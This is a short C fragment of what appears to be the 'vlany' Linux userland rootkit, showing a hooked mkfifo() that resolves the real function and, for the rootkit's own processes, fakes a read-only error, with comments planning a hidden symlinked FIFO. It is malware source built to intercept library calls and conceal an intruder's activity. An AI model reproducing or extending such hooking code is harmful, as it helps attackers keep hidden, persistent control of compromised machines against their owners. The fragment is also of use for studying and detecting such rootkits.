int mkfifo(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] mkfifo() called\n");
    #endif

    HOOK(old_mkfifo, CMKFIFO);
    if(owned())
    {
        // mkfifo(*some obscure random absolute path*, mode)
        // use char *pathname to create symbolic link to new fifo file
        // hide symbolic link instead
        errno = EROFS;
        return -1;
    }
    return old_mkfifo(pathname, mode);
}
